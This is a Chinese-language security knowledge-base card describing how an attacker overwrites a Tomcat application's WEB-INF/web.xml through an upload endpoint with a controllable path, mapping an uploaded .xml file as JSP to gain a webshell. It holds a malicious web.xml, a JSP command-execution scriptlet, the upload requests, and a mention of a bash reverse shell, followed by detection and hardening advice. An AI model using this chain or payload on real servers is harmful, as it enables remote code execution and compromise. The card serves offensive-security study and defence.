---
id: web-java-component-tomcat-webxml-overwrite-jsp-file-webshell
title: Tomcat 上传覆盖 WEB-INF/web.xml：jsp-file 将上传的 .xml 映射为 JSP 并 getshell
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-webxml-overwrite-jsp-file-webshell
aliases:
- web.xml 覆盖 getshell
- jsp-file 映射
- WEB-INF 上传
- Tomcat XML 上传 webshell
- tomcat-users.xml 弱口令
- myshell.xml
tags:
- java
- tomcat
- file-upload
- webxml
- jsp-file
- webshell
- rce
- credential
affected_versions: Tomcat 8.5.71（原文环境版本）
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-08T00:49:34+08:00'
  notes: 已对照原文与33张图：读 conf/tomcat-users.xml 得 admin/This_is_my_favorite_passwd(manager-gui)、上传 path=WEB-INF 覆盖 web.xml(jsp-file 指向 /WEB-INF/tmp/myshell.xml、url-pattern /myshell)、上传 myshell.xml、/myapp/myshell?cmd=whoami 路由可访问、curl bash 反弹 shell 拿 flag，与图19-24一致；图22 的 500 FileNotFoundException 泄漏 webapp 绝对路径亦与卡内描述一致。affected_versions Tomcat 8.5.71 为图18环境版本，保留。dup-scan pair 与 14878 的 conf/web.xml+*.xml 映射卡 verdict=duplicate(cosine 0.9715)：两卡写不同描述符（WEB-INF/web.xml+jsp-file vs 全局 conf/web.xml+*.xml url-pattern）、前置写权限与落盘目录不同，V276 已裁决并列保留，本人同意并列，不删除；本卡已在变体中标注 conf 路径未走通。
---

## 一句话结论

当 Tomcat 以 exploded 目录部署、应用又提供可控路径的 XML 上传时，攻击者可覆盖 `WEB-INF/web.xml`，用 `<jsp-file>` 把上传到 `WEB-INF/tmp/` 的任意扩展名文件声明为 JSP servlet；上下文重载后访问映射路由，Tomcat 会把该文件内容当 JSP 编译执行，从而 getshell。

## 原理

- **部署描述符可被改写**：`WEB-INF/web.xml` 是 Java Web 应用的部署描述符，`<servlet><jsp-file>` 允许把一个 JSP 源文件注册为 servlet 实现；Tomcat 的 JSP servlet 编译的是文件内容，不看扩展名。因此上传一个内容是 JSP scriptlet 的 `myshell.xml`，再由 web.xml 指向它即可执行。
- **上传路径可控**：上传接口把 `path` 参数直接拼到 webapp 根目录、`filename` 原样保留，没有限制 `WEB-INF` 等敏感目录；于是既能写 `WEB-INF/web.xml`，又能写 `WEB-INF/tmp/myshell.xml`。
- **路由与启动**：`<servlet-mapping>` 把 `/myshell` 映射到该 servlet；`<load-on-startup>1</load-on-startup>` 让它在上下文启动时初始化。`WEB-INF` 目录本身不可通过 URL 直接访问，但经过 jsp-file 映射后由 JSP servlet 服务。
- **重载生效**：Tomcat 的 ContextConfig 会检查 `WEB-INF/web.xml` 的修改时间；在默认 `autoDeploy`/`reloadable` 配置下，描述符变化会触发上下文重载，重新解析并注册新的 servlet。
- **前置信息收集**：读取 `conf/tomcat-users.xml` 可拿到明文管理后台凭据（本场景为 `manager-gui` 角色），用于登录上传页；上传时故意把目标路径当目录拼接可触发 `FileNotFoundException`，泄漏 webapp 绝对路径（如 `/opt/tomcat/webapps/myapp/WEB-INF/web.xml`）。

## 触发条件

- Tomcat 以解压目录（exploded）部署，`webapps/<app>/WEB-INF` 对应用进程可写；以 WAR 部署时对解压目录的修改可能被后续重新部署覆盖。
- 存在上传功能：`path`/目标目录参数可控，允许写入 `WEB-INF`，文件名可控，内容校验仅看扩展名（只允许 `.xml`）或不校验。
- 攻击者能进入上传功能（弱口令、凭据泄露、未授权上传等）。
- Tomcat Host 默认 `autoDeploy=true` 或上下文 `reloadable=true`；否则需要等待重启/重新部署。
- JSP servlet 未被禁用（默认启用），Tomcat 版本支持 `jsp-file`（长期通用特性，原文环境为 8.5.71）。

## 利用步骤

1. 信息收集：通过应用的任意文件读取读 `conf/tomcat-users.xml`，获得管理后台账号密码（本场景为 `admin` + 明文密码、`manager-gui` 角色），登录应用。
2. 进入上传页，修改 `path` 与文件名并制造报错，确认 webapp 绝对路径与 `WEB-INF` 位置。
3. 上传恶意 `web.xml` 到 `WEB-INF`：声明 `myshell` servlet，`<jsp-file>` 指向 `/WEB-INF/tmp/myshell.xml`，`<url-pattern>/myshell</url-pattern>`。
4. 上传 JSP 内容文件（文件名 `myshell.xml`）到 `WEB-INF/tmp/`，内容为执行 `request.getParameter("cmd")` 的 scriptlet。
5. 触发上下文重载（访问应用或等待），访问 `/myapp/myshell?cmd=whoami`；无回显时改用 base64 编码的 bash 反弹 shell。
6. 需要更稳定的管理通道时，可把哥斯拉 JSP 马按同样方式上传并通过 `/myshell` 连接。

## PoC

恶意 `web.xml`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
  <servlet>
    <servlet-name>myshell</servlet-name>
    <jsp-file>/WEB-INF/tmp/myshell.xml</jsp-file>
    <load-on-startup>1</load-on-startup>
  </servlet>
  <servlet-mapping>
    <servlet-name>myshell</servlet-name>
    <url-pattern>/myshell</url-pattern>
  </servlet-mapping>
</web-app>
```

`WEB-INF/tmp/myshell.xml`（内容按 JSP 编译）：

```jsp
<%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

上传请求（路径参数相对 webapp 根）：

```http
POST /myapp/upload?path=WEB-INF HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="web.xml"
Content-Type: application/octet-stream

<恶意 web.xml 内容>
------boundary--
```

```http
POST /myapp/upload?path=WEB-INF/tmp/ HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="myshell.xml"
Content-Type: application/octet-stream

<JSP scriptlet 内容>
------boundary--
```

```text
GET /myapp/myshell?cmd=whoami
# 触发上下文重载后由 JSP servlet 编译 WEB-INF/tmp/myshell.xml 并执行
```

## 变体与关联

- 入口变体：任意文件读取读 `conf/tomcat-users.xml`、日志中的后台凭据、未授权上传、或应用本身的认证绕过。
- 路径变体：`path` 可为相对路径、`../` 或绝对路径，取决于上传实现；报错信息常泄漏拼接后的绝对路径，可用于校准。
- 载荷变体：JSP 文件可命名为 `.xml`/`.txt` 等任意扩展名，因为执行由 `<jsp-file>` 决定；也可直接在 web.xml 中注册多个 url-pattern。
- 关联思路（需目标验证）：若能写 Tomcat 配置目录，`conf/Catalina/localhost/<app>.xml` 的 `<Context docBase>` 或 `conf/server.xml` 的 `<Context>` 也能改变 docBase/映射；本场景未走通该路径，不作为已验证手法。
- 关联卡片：[[web-java-component-tomcat-digester-jsp-runtime-webshell]]（已能执行 JSP 后的运行时 Digester webshell）、[[web-java-component-tomcat-cve-2017-12615-put-jsp-upload]]（PUT 写 JSP）、[[web-generic-file-upload-htaccess-handler-override]]（Apache 下改写 `.htaccess` 让任意文件按脚本执行的同类思路）、[[web-java-component-tomcat-appbase-empty-webroot-mapping]]（web 根目录映射错误）。
- 边界：WAR 部署且重新部署会覆盖修改、`WEB-INF` 只读、上传路径被规范化/白名单限制、JSP servlet 被禁用、或 Tomcat 关闭 autoDeploy 且未重启时，链路失效。

## 检测与防御

- 检测：上传请求的 `path`/目标目录参数包含 `WEB-INF`、`..` 或绝对路径；`WEB-INF/web.xml` 被新增/修改；web.xml 中出现指向非 `.jsp` 文件的 `jsp-file`；访问新出现的 servlet 路由并携带 `cmd` 等参数；Tomcat 进程编译 `WEB-INF` 下非常规扩展名文件、拉起 `bash`/`sh` 子进程。
- 修复：上传目录固定且位于 webapp 之外，文件名服务端生成，禁止用户控制路径；上传内容按类型校验，不允许 XML 覆盖部署描述符。
- 加固：生产环境 `WEB-INF` 与整个 webapp 目录对运行用户只读，部署使用不可变制品；关闭 `autoDeploy`/`reloadable`，变更走受控发布流程；删除 manager 应用或使用强随机凭据；对 webapp 目录做文件完整性监控。
